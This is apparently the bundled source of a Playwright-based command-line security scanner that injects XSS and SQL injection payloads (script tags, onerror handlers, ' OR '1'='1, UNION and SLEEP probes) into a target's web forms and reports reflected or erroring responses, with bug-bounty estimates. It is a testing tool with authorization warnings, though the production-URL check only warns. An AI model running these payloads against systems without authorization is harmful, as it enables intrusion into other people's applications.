#!/usr/bin/env node
import { chromium } from "playwright";
import { existsSync, mkdirSync } from "fs";
import { dirname, join } from "path";
import { fileURLToPath } from "url";

//#region src/cli.ts
const VALID_TEST_TYPES = [
	"xss",
	"sqli",
	"auth",
	"csrf",
	"idor"
];
function parseArgs(args) {
	const options = {
		url: "",
		formSelector: null,
		tests: ["xss", "sqli"],
		dryRun: false,
		screenshot: false,
		json: false,
		headless: true
	};
	for (let i = 0; i < args.length; i++) {
		const arg = args[i];
		switch (arg) {
			case "--url":
			case "-u":
				options.url = args[++i] || "";
				break;
			case "--form":
			case "-f":
				options.formSelector = args[++i] || null;
				break;
			case "--test":
			case "-t": {
				const testArg = args[++i] || "";
				options.tests = testArg.split(",").map((t) => t.trim()).filter((t) => VALID_TEST_TYPES.includes(t));
				break;
			}
			case "--dry-run":
				options.dryRun = true;
				break;
			case "--screenshot":
				options.screenshot = true;
				break;
			case "--json":
				options.json = true;
				break;
			case "--headed":
				options.headless = false;
				break;
			case "--help":
			case "-h":
				printHelp();
				process.exit(0);
		}
	}
	return options;
}
function printHelp() {
	console.log(`
Playwright Security Runner - Dynamic security testing

Warning: This tool sends real payloads to targets.
Only use on systems you are authorized to test.

Usage:
  npx tsx src/index.ts --url <url> [options]

Options:
  --url, -u <url>       Target URL (required)
  --form, -f <selector> CSS selector for form
  --test, -t <types>    Test types: xss,sqli,auth (default: xss,sqli)
  --dry-run             Show plan without executing
  --screenshot          Capture screenshots
  --json                Output as JSON
  --headed              Run with visible browser
  --help, -h            Show this help

Examples:
  npx tsx src/index.ts --url "http://localhost:3000" --dry-run
  npx tsx src/index.ts --url "http://localhost:3000/login" --test xss,sqli
`);
}
function isProductionUrl(url) {
	const productionIndicators = [
		/^https:\/\/(?!localhost)/,
		/\.(com|org|net|io|co|app)(?:\/|$)/,
		/^https:\/\/www\./,
		/^https:\/\/api\./
	];
	return productionIndicators.some((pattern) => pattern.test(url));
}
function printProductionWarning(url) {
	console.log(`
WARNING: Production URL Detected

The target URL appears to be a production system:
${url}

Security testing against production:
- May cause service disruption
- Could trigger security alerts
- May violate terms of service

Ensure you have explicit authorization to test this target.
`);
}

//#endregion
//#region src/payloads.ts
const PAYLOADS = {
	xss: [
		{
			name: "script-tag",
			value: "<script>alert(1)</script>"
		},
		{
			name: "img-onerror",
			value: "<img src=x onerror=alert(1)>"
		},
		{
			name: "svg-onload",
			value: "<svg onload=alert(1)>"
		},
		{
			name: "body-onload",
			value: "<body onload=alert(1)>"
		},
		{
			name: "quote-escape",
			value: "'\"><script>alert(1)</script>"
		}
	],
	sqli: [
		{
			name: "or-true",
			value: "' OR '1'='1"
		},
		{
			name: "or-true-comment",
			value: "' OR '1'='1'--"
		},
		{
			name: "admin-bypass",
			value: "admin'--"
		},
		{
			name: "union-null",
			value: "' UNION SELECT NULL--"
		},
		{
			name: "sleep-test",
			value: "' AND SLEEP(3)--"
		}
	],
	auth: [
		{
			name: "empty-password",
			value: ""
		},
		{
			name: "sql-bypass",
			value: "' OR '1'='1"
		},
		{
			name: "admin-guess",
			value: "admin"
		}
	]
};
const BOUNTY_ESTIMATES = {
	xss: "$500 - $10,000",
	sqli: "$5,000 - $50,000",
	csrf: "$1,000 - $10,000",
	auth: "$10,000 - $50,000",
	idor: "$2,000 - $50,000"
};
const SQL_ERROR_PATTERNS = [
	"SQL syntax",
	"mysql_",
	"mysqli_",
	"pg_",
	"ORA-",
	"SQLite",
	"SQLSTATE",
	"syntax error",
	"unterminated"
];

//#endregion
//#region src/runner.ts
const __dirname = dirname(fileURLToPath(import.meta.url));
async function findForms(page, formSelector) {
	if (formSelector) {
		const form = page.locator(formSelector);
		const count$1 = await form.count();
		if (count$1 > 0) return [{ selector: formSelector }];
		return [];
	}
	const forms = page.locator("form");
	const count = await forms.count();
	return Array.from({ length: count }, (_, index) => ({ selector: `form:nth-of-type(${index + 1})` }));
}
async function getFormInputs(page, formSelector) {
	const inputs = [];
	const inputLocator = page.locator(`${formSelector} input:not([type="hidden"]):not([type="submit"]):not([type="button"]), ${formSelector} textarea`);
	const count = await inputLocator.count();
	for (let i = 0; i < count; i++) {
		const el = inputLocator.nth(i);
		const name = await el.getAttribute("name") || "";
		const id = await el.getAttribute("id") || "";
		const type = await el.getAttribute("type") || "text";
		inputs.push({
			name: name || id || "unnamed",
			type,
			selector: name ? `[name="${name}"]` : id ? `#${id}` : `:nth-child(${i + 1})`
		});
	}
	return inputs;
}
async function testPayload(page, formSelector, inputSelector, payload, options) {
	const result = {
		payload: payload.value,
		payloadName: payload.name,
		field: inputSelector,
		timestamp: new Date().toISOString(),
		vulnerable: false,
		evidence: []
	};
	try {
		await page.fill(`${formSelector} ${inputSelector}`, payload.value);
		await Promise.all([page.waitForLoadState("networkidle").catch(() => {}), page.click(`${formSelector} [type="submit"], ${formSelector} button:not([type="button"])`).catch(() => page.press(`${formSelector} ${inputSelector}`, "Enter"))]);
		await page.waitForTimeout(500);
		const content = await page.content();
		if (content.includes(payload.value)) {
			result.vulnerable = true;
			result.evidence.push("Payload reflected in response without encoding");
		}
		const dialogPromise = page.waitForEvent("dialog", { timeout: 1e3 }).catch(() => null);
		const dialog = await dialogPromise;
		if (dialog) {
			result.vulnerable = true;
			result.evidence.push(`Alert dialog triggered: "${dialog.message()}"`);
			await dialog.dismiss();
		}
		for (const error of SQL_ERROR_PATTERNS) if (content.toLowerCase().includes(error.toLowerCase())) {
			result.vulnerable = true;
			result.evidence.push(`SQL error detected: "${error}"`);
		}
		if (options.screenshot && result.vulnerable) {
			const screenshotDir = join(__dirname, "..", "screenshots");
			if (!existsSync(screenshotDir)) mkdirSync(screenshotDir, { recursive: true });
			const screenshotPath = join(screenshotDir, `${payload.name}-${Date.now()}.png`);
			await page.screenshot({ path: screenshotPath });
			result.screenshot = screenshotPath;
		}
	} catch (error) {
		result.error = error instanceof Error ? error.message : String(error);
	}
	return result;
}
async function runTests(options) {
	const results = {
		target: options.url,
		timestamp: new Date().toISOString(),
		tests: [],
		summary: {
			total: 0,
			vulnerable: 0
		}
	};
	const browser = await chromium.launch({ headless: options.headless });
	const context = await browser.newContext();
	const page = await context.newPage();
	try {
		await page.goto(options.url, { waitUntil: "networkidle" });
		const forms = await findForms(page, options.formSelector);
		if (forms.length === 0) {
			console.log("No forms found on page");
			return results;
		}
		for (const form of forms) {
			const inputs = await getFormInputs(page, form.selector);
			for (const input of inputs) for (const testType of options.tests) {
				const payloads = PAYLOADS[testType] || [];
				for (const payload of payloads) {
					await page.goto(options.url, { waitUntil: "networkidle" });
					const result = await testPayload(page, form.selector, input.selector, payload, options);
					result.testType = testType;
					result.form = form.selector;
					results.tests.push(result);
					results.summary.total++;
					if (result.vulnerable) results.summary.vulnerable++;
					await page.waitForTimeout(200);
				}
			}
		}
	} finally {
		await browser.close();
	}
	return results;
}

//#endregion
//#region src/reporter.ts
function printDryRun(options) {
	console.log(`
DRY RUN MODE

Target: ${options.url}
Form: ${options.formSelector || "All forms"}
Tests: ${options.tests.join(", ")}

Payloads that would be sent:
`);
	for (const testType of options.tests) {
		const payloads = PAYLOADS[testType] || [];
		console.log(`\n[${testType.toUpperCase()}] - Bounty: ${BOUNTY_ESTIMATES[testType]}`);
		payloads.forEach((p, i) => {
			console.log(`  ${i + 1}. ${p.name}: ${p.value.substring(0, 50)}...`);
		});
	}
	console.log(`\nNo requests sent. Remove --dry-run to execute tests.\n`);
}
function printResults(results) {
	console.log(`
# Security Test Results

**Target**: ${results.target}
**Timestamp**: ${results.timestamp}

## Summary
- Total tests: ${results.summary.total}
- Vulnerabilities found: ${results.summary.vulnerable}
`);
	const vulnerabilities = results.tests.filter((t) => t.vulnerable);
	if (vulnerabilities.length > 0) {
		console.log(`## Vulnerabilities Found\n`);
		vulnerabilities.forEach((vuln, index) => {
			const testType = vuln.testType;
			console.log(`### ${index + 1}. ${testType.toUpperCase()} - ${vuln.payloadName}`);
			console.log(`**Severity**: HIGH`);
			console.log(`**Bounty Estimate**: ${BOUNTY_ESTIMATES[testType]}`);
			console.log(`**Form**: ${vuln.form}`);
			console.log(`**Field**: ${vuln.field}`);
			console.log(`**Payload**: \`${vuln.payload}\``);
			console.log(`\n**Evidence**:`);
			vuln.evidence.forEach((e) => console.log(`- ${e}`));
			if (vuln.screenshot) console.log(`\n**Screenshot**: ${vuln.screenshot}`);
			console.log(`\n---\n`);
		});
	} else {
		console.log(`## No Vulnerabilities Found\n`);
		console.log(`All ${results.summary.total} tests passed without detecting vulnerabilities.`);
	}
}

//#endregion
//#region src/index.ts
async function main() {
	const args = process.argv.slice(2);
	if (args.length === 0) {
		printHelp();
		process.exit(0);
	}
	const options = parseArgs(args);
	if (!options.url) {
		console.error("Error: --url is required");
		process.exit(1);
	}
	if (isProductionUrl(options.url) && !options.dryRun) printProductionWarning(options.url);
	if (options.dryRun) {
		printDryRun(options);
		process.exit(0);
	}
	console.log(`\nStarting security tests against: ${options.url}\n`);
	try {
		const results = await runTests(options);
		if (options.json) console.log(JSON.stringify(results, null, 2));
		else printResults(results);
		if (results.summary.vulnerable > 0) process.exit(1);
	} catch (error) {
		console.error(`Error: ${error instanceof Error ? error.message : String(error)}`);
		process.exit(1);
	}
}
main();

//#endregion
//# sourceMappingURL=index.js.map